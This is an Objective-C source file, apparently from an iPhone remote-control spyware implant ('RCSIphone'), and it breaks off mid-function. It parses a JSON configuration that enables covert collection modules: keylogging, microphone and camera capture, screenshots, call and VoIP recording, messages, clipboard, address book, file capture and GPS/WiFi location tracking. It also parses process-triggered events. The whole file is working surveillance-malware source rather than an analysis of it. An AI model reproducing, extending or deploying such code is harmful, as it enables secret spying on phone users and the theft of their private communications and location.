//
//  RCSIJSonConfiguration.m
//  RCSIphone
//
//  Created by kiodo on 23/02/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "SBJSon.h"
#import "RCSMCommon.h"
#import "RCSIJSonConfiguration.h"

#define DEBUG_JSON_CONFIG_

@implementation SBJSonConfigDelegate

- (id)init
{
  self = [super init];
  
  if (self) {
    adapter = [[SBJsonStreamParserAdapter alloc] init];
    adapter.delegate = (id)self;
    
    parser = [[SBJsonStreamParser alloc] init];
    parser.delegate = adapter;
    
//    mEventsList  = [[NSMutableArray alloc] initWithCapacity:0];
//    mActionsList = [[NSMutableArray alloc] initWithCapacity:0];
//    mAgentsList  = [[NSMutableArray alloc] initWithCapacity:0];
  }
  
  return self;
}

- (void)dealloc
{
//  [mEventsList release];
//  [mAgentsList release];
//  [mActionsList release];
  
  [parser release];
  [adapter release];
  [super dealloc];
}

#
#
#pragma mark Modules parsing
#
#
typedef struct _fileConfiguration {
  u_int minFileSize;
  u_int maxFileSize;
  u_int hiMinDate;
  u_int loMinDate;
  u_int reserved1;
  u_int reserved2;
  u_int noFileOpen;
  u_int acceptCount;
  u_int denyCount;
  char patterns[1]; // wchar_t
} file_t;

- (void)initFileModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  file_t file;
  int64_t winDate;
  id enabled = AGENT_ENABLED;
  NSArray *keys = nil;
  NSArray *objects = nil;  
  NSData *dataNull = [NSData dataWithBytes: "\x00\x00" length:2];
  
  NSNumber *type = [NSNumber numberWithUnsignedInt: AGENT_FILECAPTURE];
  NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
  
  NSNumber *capture = [aModule objectForKey:@"capture"];
  NSNumber *open    = [aModule objectForKey:@"open"];
  NSNumber *minsize = [aModule objectForKey:@"minsize"];
  NSNumber *maxsize = [aModule objectForKey:@"maxsize"];
  NSString *date    = [aModule objectForKey:@"date"];
  NSArray  *accept  = [aModule objectForKey:@"accept"];
  NSArray  *deny    = [aModule objectForKey:@"deny"];
  
  if (status == nil || [status boolValue] == FALSE)
    enabled = AGENT_DISABLED;
    
  file.maxFileSize = (maxsize != nil ? [maxsize intValue] : 500000);
  file.noFileOpen  = (open    != nil ? [open boolValue] : TRUE);
  
  if (capture != nil && [capture boolValue] == TRUE)
    {
      file.minFileSize = (minsize != nil ? [minsize intValue] : 1);
    }
  else
    {
      // file capt flag is off: disable capture by reset minFileSize
      // (see RCSMAgentFileCapture.m : 88
      file.minFileSize = 0;
    }
  
  winDate = [self calculateWinDate: (date != nil ? date : @"1970-01-01 00:00:00")];
  
  file.loMinDate = winDate & 0xFFFFFFFF;
  file.hiMinDate = (winDate >> 32) & 0xFFFFFFFF;
  
  file.acceptCount = (accept != nil ? [accept count] : 0) ; 
  file.denyCount   = (deny   != nil ? [deny count] : 0);
  
  // fill the string array
  NSMutableData *acceptStrings = [[NSMutableData alloc] initWithLength: 0];
  
  for (int i=0; i < file.acceptCount; i++) 
    {
      NSString *tmpStr  = [accept objectAtIndex:i];
      NSData   *dataStr = [tmpStr dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
      
      [acceptStrings appendData:dataStr];
      [acceptStrings appendData:dataNull]; 
    }
  
  NSMutableData *denyStrings = [[NSMutableData alloc] initWithLength: 0];
      
  for (int i=0; i < file.denyCount; i++) 
    {
      NSString *tmpStr  = [deny objectAtIndex:i];
      NSData   *dataStr = [tmpStr dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
    
      [denyStrings appendData:dataStr];
      [denyStrings appendData:dataNull]; 
    }
  
  
  NSMutableData *data = [[NSMutableData alloc] initWithCapacity:(sizeof(file_t) - sizeof(char*)) + 
                                                                [acceptStrings length] + 
                                                                [denyStrings length]];
  char *dataBuff = (char*)[data bytes];
  
  // struct - patterns
  memcpy(dataBuff, &file, (sizeof(file_t) - sizeof(char*)));
  dataBuff += (sizeof(file_t) - sizeof(char*));     
  
  memcpy(dataBuff, [acceptStrings bytes], [acceptStrings length]);
  dataBuff += [acceptStrings length];
  
  memcpy(dataBuff, [denyStrings bytes], [denyStrings length]);
                                                                                                                                                                      
  [acceptStrings release];
  [denyStrings release];
  
  keys = [NSArray arrayWithObjects: @"agentID",
                                    @"status",
                                    @"data",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       enabled, 
                                       data,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  [data release];
  
  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
  
  [moduleConfiguration addEntriesFromDictionary: dictionary];
  
  [mAgentsList addObject: moduleConfiguration];
  
  [moduleConfiguration release];
  
  [pool release];
}

// Done.
- (void)initABModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  id enabled = AGENT_ENABLED;
  NSArray *keys = nil;
  NSArray *objects = nil;  
  
  NSNumber *type = [NSNumber numberWithUnsignedInt: AGENT_ORGANIZER];
  NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
  
  if (status == nil || [status boolValue] == FALSE)
    enabled = AGENT_DISABLED;
  
  keys = [NSArray arrayWithObjects: @"agentID",
                                    @"status",
                                    @"data",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       enabled, 
                                       MODULE_EMPTY_CONF,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
  
  [moduleConfiguration addEntriesFromDictionary: dictionary];
  
  [mAgentsList addObject: moduleConfiguration];
  
  [moduleConfiguration release];
  
  [pool release];
}

- (void)initDeviceModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  id enabled = AGENT_ENABLED;
  NSArray *keys = nil;
  NSArray *objects = nil;  
  
  NSNumber *type = [NSNumber numberWithUnsignedInt: AGENT_DEVICE];
  NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
  // not used yet
  NSNumber *applist = [aModule objectForKey:MODULE_DEVICE_APPLIST_KEY];
  
  if (status == nil || [status boolValue] == FALSE)
    enabled = AGENT_DISABLED;
  
  keys = [NSArray arrayWithObjects: @"agentID",
          @"status",
          @"data",
          nil];
  
  objects = [NSArray arrayWithObjects: type, 
             enabled, 
             (applist != nil ? applist : MODULE_EMPTY_CONF),
             nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
  
  [moduleConfiguration addEntriesFromDictionary: dictionary];
  
  [mAgentsList addObject: moduleConfiguration];
  
  [moduleConfiguration release];
  
  [pool release];
}

typedef struct _position {
  UInt32 sleepTime;
#define LOGGER_GPS  1  // Take GPS Position
#define LOGGER_GSM  2  // Take BTS Position
#define LOGGER_WIFI 4  // Take nearby WiFi list
  UInt32 iType;
} position_t;

// Done.
- (void)initPositionModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSArray *keys = nil;
  NSArray *objects = nil; 
  NSData *data;
  id enabled = AGENT_DISABLED; 
  position_t posStruct;

  NSNumber *type = [NSNumber numberWithUnsignedInt: AGENT_POSITION];
  NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
  
  posStruct.iType = LOGGER_WIFI;
  posStruct.sleepTime = 30;
  
  data = [[NSData alloc] initWithBytes: &posStruct length:sizeof(posStruct)];
  
  if (status != nil || [status boolValue] == TRUE)
    enabled = AGENT_ENABLED;
  
  keys = [NSArray arrayWithObjects: @"agentID",
                                    @"status",
                                    @"data",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       enabled, 
                                       data,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
  
  [moduleConfiguration addEntriesFromDictionary: dictionary];
  
  [mAgentsList addObject: moduleConfiguration];
  
  [moduleConfiguration release];
  
  [pool release];
}

// implemented
- (void)initCalllistModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  id enabled = AGENT_ENABLED;
  NSArray *keys = nil;
  NSArray *objects = nil;
  
#ifdef DEBUG_JSON_CONFIG
  NSLog(@"%s: registering module type %@", __FUNCTION__, [aModule objectForKey: @"desc"]);
#endif
  
  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
  
  NSNumber *type  = [NSNumber numberWithUnsignedInt: AGENT_CALL_LIST];
  NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
  
  if (status == nil || [status boolValue] == FALSE)
    enabled = AGENT_DISABLED;
  
  keys = [NSArray arrayWithObjects: @"agentID",
          @"status",
          @"data",
          nil];
  
  objects = [NSArray arrayWithObjects: type, 
             enabled, 
             MODULE_EMPTY_CONF,
             nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  [moduleConfiguration addEntriesFromDictionary: dictionary];
  
  [mAgentsList addObject: moduleConfiguration];
  
  [moduleConfiguration release];
  
  [pool release];
}

- (void)initCalendarModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSArray *keys;
  NSArray *objects;
  
#ifdef DEBUG_JSON_CONFIG
  NSLog(@"%s: registering module type %@", __FUNCTION__, [aModule objectForKey: @"desc"]);
#endif
  
  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
  
  NSNumber *type    = [NSNumber numberWithUnsignedInt: AGENT_ORGANIZER];
  
  keys = [NSArray arrayWithObjects: @"agentID",
          @"status",
          @"data",
          nil];
  
  objects = [NSArray arrayWithObjects: type, 
             AGENT_DISABLED, 
             MODULE_EMPTY_CONF,
             nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  [moduleConfiguration addEntriesFromDictionary: dictionary];
  
  [mAgentsList addObject: moduleConfiguration];
  
  [moduleConfiguration release];
  
  [pool release];
}

// Done. Verify 0.22 threshold
- (void)initMicModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  microphoneAgentStruct_t micStruct;
  id enabled = AGENT_ENABLED;
  NSArray *keys = nil;
  NSArray *objects = nil;
  NSData  *data;
  
  NSNumber *type   = [NSNumber numberWithUnsignedInt: AGENT_MICROPHONE];
  NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
  
  // not used
  // NSNumber *vad    = [aModule objectForKey:MODULE_MIC_VAD_KEY];
  // NSNumber *vadThr = [aModule objectForKey: MODULE_MIC_VADTHRESHOLD_KEY];
  NSNumber *sil    = [aModule objectForKey: MODULE_MIC_SILENCE_KEY];
  NSNumber *thr    = [aModule objectForKey: MODULE_MIC_THRESHOLD_KEY];
  
  if (status == nil || [status boolValue] == FALSE)
    enabled = AGENT_DISABLED;
  
  memset(&micStruct, 0, sizeof(micStruct));
  micStruct.detectSilence = (sil != nil ? [sil unsignedIntValue] : 5);
  micStruct.silenceThreshold = (int)(thr != nil ? ([thr floatValue] * 100) : 22);
  
  data = [[NSData alloc] initWithBytes: &micStruct length: sizeof(microphoneAgentStruct_t)];
  
  keys = [NSArray arrayWithObjects: @"agentID",
                                    @"status",
                                    @"data",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       enabled, 
                                       data,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];

  [moduleConfiguration addEntriesFromDictionary: dictionary];
  
  [mAgentsList addObject: moduleConfiguration];
  
  [moduleConfiguration release];
  
  [data release];
  
  [pool release];
}

// Done.
- (void)initCameraModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  cameraStruct_t camStruct;
  id enabled = AGENT_ENABLED;
  NSArray *keys = nil;
  NSArray *objects = nil;
  NSData  *data;

  NSNumber *type    = [NSNumber numberWithUnsignedInt:AGENT_CAM];
  NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
  
  // timeStep and numStep forced for new paradigm: event repeatition
  camStruct.sleepTime   = 0;
  camStruct.numOfFrame  = 1;
  
  if (status == nil || [status boolValue] == FALSE)
    enabled = AGENT_DISABLED;
  
  // setup module structs NSData
  data = [[NSData alloc] initWithBytes: &camStruct length: sizeof(cameraStruct_t)];
  
  keys = [NSArray arrayWithObjects: @"agentID",
                                    @"status",
                                    @"data",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       enabled, 
                                       data,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
 
   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
  
  [moduleConfiguration addEntriesFromDictionary: dictionary];
  
  [mAgentsList addObject: moduleConfiguration];
  
  [moduleConfiguration release];
  
  [data release];
  
  [pool release];
}

// Done.
- (void)initScrshotModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  screenshotAgentStruct_t scrStruct;
  id enabled = AGENT_ENABLED;
  NSArray *keys = nil;
  NSArray *objects = nil;
  NSData  *data;
 
  NSNumber *type    = [NSNumber numberWithUnsignedInt:AGENT_SCREENSHOT];
  NSNumber *onlyWin = [aModule objectForKey:MODULE_SCRSHOT_ONLYWIN_KEY];
  NSNumber *newWin  = [aModule objectForKey:MODULE_SCRSHOT_NEWWIN_KEY];
  NSNumber *status  = [aModule objectForKey: MODULES_STATUS_KEY];
  
  if (status == nil || [status boolValue] == FALSE)
    enabled = AGENT_DISABLED;
  
  memset(&scrStruct, 0, sizeof(scrStruct));
  
  // setup module structs
  scrStruct.grabActiveWindow  = (onlyWin != nil ? [onlyWin unsignedIntValue] : 0);
  scrStruct.grabNewWindows    = (newWin  != nil ? [newWin boolValue] : 0);
  scrStruct.sleepTime         = 0xFFFFFFFF;
  scrStruct.dwTag             = 0xFFFFFFFF;
  
  data = [[NSData alloc] initWithBytes: &scrStruct length: sizeof(screenshotAgentStruct_t)];
  
  keys = [NSArray arrayWithObjects: @"agentID",
                                    @"status",
                                    @"data",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       enabled, 
                                       data,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
 
   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
  
  [moduleConfiguration addEntriesFromDictionary: dictionary];

  [mAgentsList addObject: moduleConfiguration];
  
  [moduleConfiguration release];
  
  [data release];
  
  [pool release];
}

typedef struct  {
  u_int delimiter;
  BOOL isSnapshotActive;
} urlStruct;

// Done.
- (void)initUrlModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  urlStruct url;
  id enabled = AGENT_ENABLED;
  NSArray *keys = nil;
  NSArray *objects = nil;
  NSData  *data;
  
  NSNumber *type    = [NSNumber numberWithUnsignedInt: AGENT_URL];
  NSNumber *status  = [aModule objectForKey: MODULES_STATUS_KEY];
  
  url.delimiter         = 0;
  url.isSnapshotActive  = FALSE;
  
  data = [[NSData alloc] initWithBytes: &url length:sizeof(url)];
  
  if (status == nil || [status boolValue] == FALSE)
    enabled = AGENT_DISABLED;
  
  keys = [NSArray arrayWithObjects: @"agentID",
                                    @"status",
                                    @"data",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       enabled, 
                                       data,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  
  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];

  [moduleConfiguration addEntriesFromDictionary: dictionary];
  
  [mAgentsList addObject: moduleConfiguration];
  
  [moduleConfiguration release];
  
  [data release];
  
  [pool release];
}

typedef struct  {
  u_int width;
  u_int height;
} mouse_t;

//Done.
- (void)initMouseModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  mouse_t mouse;
  id enabled = AGENT_ENABLED;
  NSArray *keys = nil;
  NSArray *objects = nil;
  NSData  *data;
  
  NSNumber *type    = [NSNumber numberWithUnsignedInt: AGENT_MOUSE];
  NSNumber *status  = [aModule objectForKey: MODULES_STATUS_KEY];
  NSNumber *width   = [aModule objectForKey: @"width"];
  NSNumber *height  = [aModule objectForKey: @"height"];

  mouse.width   = (width  != nil ? [width  intValue] : 50);
  mouse.height  = (height != nil ? [height intValue] : 50);
  
  data = [[NSData alloc] initWithBytes: &mouse length:sizeof(mouse)];
  
  if (status == nil || [status boolValue] == FALSE)
    enabled = AGENT_DISABLED;
  
  keys = [NSArray arrayWithObjects: @"agentID",
                                    @"status",
                                    @"data",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       enabled, 
                                       data,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  
  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
  
  [moduleConfiguration addEntriesFromDictionary: dictionary];
  
  [mAgentsList addObject: moduleConfiguration];
  
  [moduleConfiguration release];
  
  [data release];
  
  [pool release];
}

// Done.
- (void)initChatModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

  id enabled = AGENT_ENABLED;
  NSArray *keys = nil;
  NSArray *objects = nil;
  NSData  *data;
  
  NSNumber *type    = [NSNumber numberWithUnsignedInt: AGENT_CHAT];
  NSNumber *status  = [aModule objectForKey: MODULES_STATUS_KEY];
  
  if (status == nil || [status boolValue] == FALSE)
    enabled = AGENT_DISABLED;
  
  keys = [NSArray arrayWithObjects: @"agentID",
                                    @"status",
                                    @"data",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       enabled, 
                                       MODULE_EMPTY_CONF,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  
  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
  
  [moduleConfiguration addEntriesFromDictionary: dictionary];
  
  [mAgentsList addObject: moduleConfiguration];
  
  [moduleConfiguration release];
  
  [data release];
  
  [pool release];
}

// implemented
- (void)initAppModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  id enabled = AGENT_ENABLED;
  NSArray *keys = nil;
  NSArray *objects = nil;
  
#ifdef DEBUG_JSON_CONFIG
  NSLog(@"%s: registering module type %@", __FUNCTION__, [aModule objectForKey: @"desc"]);
#endif
  
  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
  
  NSNumber *type = [NSNumber numberWithUnsignedInt: AGENT_APPLICATION];
  NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
  
  if (status == nil || [status boolValue] == FALSE)
    enabled = AGENT_DISABLED;
  
  keys = [NSArray arrayWithObjects: @"agentID",
          @"status",
          @"data",
          nil];
  
  objects = [NSArray arrayWithObjects: type, 
             enabled, 
             MODULE_EMPTY_CONF,
             nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  [moduleConfiguration addEntriesFromDictionary: dictionary];
  
  
  
  [mAgentsList addObject: moduleConfiguration];
  [moduleConfiguration release];
  [pool release];
}

// Done.
- (void)initKeyLogModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  id enabled = AGENT_ENABLED;
  NSArray *keys = nil;
  NSArray *objects = nil;
  
  NSNumber *type  = [NSNumber numberWithUnsignedInt: AGENT_KEYLOG];
  NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
  
  if (status == nil || [status boolValue] == FALSE)
    enabled = AGENT_DISABLED;
  
  keys = [NSArray arrayWithObjects: @"agentID",
                                    @"status",
                                    @"data",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       enabled, 
                                       MODULE_EMPTY_CONF,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
  
  [moduleConfiguration addEntriesFromDictionary: dictionary];
  
  [mAgentsList addObject: moduleConfiguration];
  
  [moduleConfiguration release];
  
  [pool release];
}

// Done.
- (void)initClipboardModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  id enabled = AGENT_ENABLED;
  NSArray *keys = nil;
  NSArray *objects = nil;
  
  NSNumber *type  = [NSNumber numberWithUnsignedInt: AGENT_CLIPBOARD];
  NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
  
  if (status == nil || [status boolValue] == FALSE)
    enabled = AGENT_DISABLED;
  
  keys = [NSArray arrayWithObjects: @"agentID",
                                    @"status",
                                    @"data",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       enabled, 
                                       MODULE_EMPTY_CONF,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
    
  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];

  [moduleConfiguration addEntriesFromDictionary: dictionary];
  
  [mAgentsList addObject: moduleConfiguration];
  
  [moduleConfiguration release];
  
  [pool release];
}

- (void)initMessagesModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  id enabled = AGENT_ENABLED;
  NSArray *keys = nil;
  NSArray *objects = nil;
  
#ifdef DEBUG_JSON_CONFIG
  NSLog(@"%s: registering module type %@", __FUNCTION__, [aModule objectForKey: @"desc"]);
#endif
  
  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
  
  NSNumber *type  = [NSNumber numberWithUnsignedInt: AGENT_MESSAGES];
  NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
  
  if (status == nil || [status boolValue] == FALSE)
    enabled = AGENT_DISABLED;
  
  keys = [NSArray arrayWithObjects: @"agentID",
          @"status",
          @"data",
          nil];
  
  objects = [NSArray arrayWithObjects: type, 
             enabled, 
             MODULE_EMPTY_CONF,
             nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  [moduleConfiguration addEntriesFromDictionary: dictionary];
  
  [mAgentsList addObject: moduleConfiguration];
  
  [moduleConfiguration release];
  
  [pool release];
}

typedef struct  {
  u_int sampleSize;   // Max single-sample size
  u_int compression;  // Compression factor
} voip_t;

// Done.
- (void)initCallModule: (NSDictionary *)aModule
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  voip_t voip;
  id enabled = AGENT_ENABLED;
  NSArray *keys = nil;
  NSArray *objects = nil;
  NSData  *data;
  
  NSNumber *type        = [NSNumber numberWithUnsignedInt:AGENT_VOIP];
  NSNumber *compression = [aModule objectForKey:@"compression"];
  NSNumber *buffer      = [aModule objectForKey:@"buffer"];
  NSNumber *status      = [aModule objectForKey: MODULES_STATUS_KEY];
  
  if (status == nil || [status boolValue] == FALSE)
    enabled = AGENT_DISABLED;
  
  memset(&voip, 0, sizeof(voip));

  voip.sampleSize  = (buffer != nil ? [buffer unsignedIntValue] : 512000);
  voip.compression = (compression != nil ? [compression intValue] : 5);
  
  data = [[NSData alloc] initWithBytes: &voip length: sizeof(voip)];
  
  keys = [NSArray arrayWithObjects: @"agentID",
                                    @"status",
                                    @"data",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       enabled, 
                                       data,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
  
  [moduleConfiguration addEntriesFromDictionary: dictionary];
  
  [mAgentsList addObject: moduleConfiguration];
  
  [moduleConfiguration release];
  
  [data release];
  
  [pool release];
}

- (void)parseAndAddModules:(NSDictionary *)dict
{  
  NSArray *modulesArray = [dict objectForKey: MODULES_KEY];
  
  if (modulesArray == nil) 
    {
#ifdef DEBUG_JSON_CONFIG
    NSLog(@"%s: no modulesArray found", __FUNCTION__);
#endif
    return;
    }
  
  for (int i=0; i < [modulesArray count]; i++) 
    {
    NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
    
    NSDictionary *module = (NSDictionary *)[modulesArray objectAtIndex: i];
    
    NSString *moduleType = [module objectForKey: MODULES_TYPE_KEY];
    
    if (moduleType != nil)
      {
      if ([moduleType compare: MODULES_ADDBK_KEY] == NSOrderedSame) 
        {
        [self initABModule: module];
        }
      else if ([moduleType compare: MODULES_DEV_KEY] == NSOrderedSame) 
        {
        [self initDeviceModule: module];
        }
      else if ([moduleType compare: MODULES_CLIST_KEY] == NSOrderedSame) 
        {
        [self initCalllistModule: module];
        }
      else if ([moduleType compare: MODULES_CAL_KEY] == NSOrderedSame) 
        {
        [self initCalendarModule: module];
        }
      else if ([moduleType compare: MODULES_MIC_KEY] == NSOrderedSame) 
        {
        [self initMicModule: module];
        }
      else if ([moduleType compare: MODULES_SNP_KEY] == NSOrderedSame) 
        {
        [self initScrshotModule: module];
        }
      else if ([moduleType compare: MODULES_URL_KEY] == NSOrderedSame) 
        {
        [self initUrlModule: module];
        }
      else if ([moduleType compare: MODULES_APP_KEY] == NSOrderedSame) 
        {
        [self initAppModule: module];
        }      
      else if ([moduleType compare: MODULES_KEYL_KEY] == NSOrderedSame) 
        {
        [self initKeyLogModule: module];
        }
      else if ([moduleType compare: MODULES_MSGS_KEY] == NSOrderedSame) 
        {
        [self initMessagesModule: module];
        }
      else if ([moduleType compare: MODULES_CLIP_KEY] == NSOrderedSame) 
        {
        [self initClipboardModule: module];
        }
      else if ([moduleType compare: MODULES_CAMERA_KEY] == NSOrderedSame) 
        {
        [self initCameraModule: module];
        }
      else if ([moduleType compare: MODULES_POSITION_KEY] == NSOrderedSame) 
        {
          [self initPositionModule: module];
        }
//      else if ([moduleType compare: MODULES_CHAT_KEY] == NSOrderedSame) 
//        {
//          [self initChatModule: module];
//        }
      else if ([moduleType compare: @"mouse"] == NSOrderedSame) 
        {
          [self initMouseModule: module];
        }
      else if ([moduleType compare: @"call"] == NSOrderedSame) 
        {
          [self initCallModule: module];
        }
      }
    
    [inner release];
    }
}

#
#
#pragma mark Events parsing
#
#

#define EVENT_PROCESS_ON_PROC   0x00000000
#define EVENT_PROCESS_ON_WINDOW 0x00000001
#define EVENT_PROCESS_ON_FOCUS  0x00000002  
// Done. check comments.
- (void)addProcessEvent: (NSDictionary *)anEvent
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSArray *keys;
  NSArray *objects;
  NSData  *data;
  processStruct_t procStruct;

  // Default value for all parameters: 0xFFFFFFFF
  NSNumber *defNum  = [NSNumber numberWithUnsignedInt: ACTION_UNKNOWN];
  
  NSNumber *type    = [NSNumber numberWithUnsignedInt: EVENT_PROCESS];
  NSNumber *action  = [anEvent objectForKey: EVENTS_ACTION_START_KEY];
  NSNumber *enabled = [anEvent objectForKey: EVENT_ENABLED_KEY];
  NSNumber *repeat  = [anEvent objectForKey: EVENT_ACTION_REP_KEY];
  NSNumber *delay   = [anEvent objectForKey: EVENT_ACTION_DELAY_KEY];
  NSNumber *iter    = [anEvent objectForKey: EVENT_ACTION_ITER_KEY];
  NSNumber *end     = [anEvent objectForKey: EVENT_ACTION_END_KEY];
   
  memset(&procStruct, 0, sizeof(procStruct));
  
  if ([anEvent objectForKey: EVENT_ACTION_END_KEY] != nil) 
    {
      procStruct.onClose = [[anEvent objectForKey: EVENT_ACTION_END_KEY] unsignedIntValue];
    }
  else
    {
      procStruct.onClose  = 0xFFFFFFFF;
    }
 
  if ([anEvent objectForKey: EVENT_PROC_WINDOW_KEY] != nil) 
    {
      if ([[anEvent objectForKey: EVENT_PROC_WINDOW_KEY] intValue] == TRUE)
        procStruct.lookForTitle = EVENT_PROCESS_ON_WINDOW;
      else
        procStruct.lookForTitle = EVENT_PROCESS_ON_PROC;
    }
  else
    procStruct.lookForTitle = EVENT_PROCESS_ON_PROC;
  
  if ([anEvent objectForKey: EVENT_PROC_FOCUS_KEY] != nil) 
    {
      if ([[anEvent objectForKey: EVENT_PROC_FOCUS_KEY] intValue] == TRUE)
        procStruct.lookForTitle |= EVENT_PROCESS_ON_FOCUS;
    }

    
  if ([anEvent objectForKey: EVENT_PROC_NAME_KEY] != nil) 
    {
      //FIXED- ???
//      u_int nameLength = (u_int)[[anEvent objectForKey: EVENT_PROC_NAME_KEY] 
//                                 lengthOfBytesUsingEncoding: NSUTF8StringEncoding];
//      
//      // with rcs8
//      procStruct.nameLength =  nameLength > 256 ? 256 : nameLength;
      
      //XXX- controllare che sia convertito in utf16
      NSData *nameData = [[anEvent objectForKey: EVENT_PROC_NAME_KEY] dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
      u_int nameLength = [nameData length] < 256 ? [nameData length] : 256;
      memcpy(procStruct.name, [nameData bytes], nameLength);
    
    }
  
  data = [NSData dataWithBytes: &procStruct length: sizeof(procStruct)];
  
  keys = [NSArray arrayWithObjects: @"type",      // for comp
                                    @"actionID",  // for comp
                                    @"data",      // for comp
                                    @"status",    // for comp
                                    @"monitor",   // for comp
                                    @"enabled",
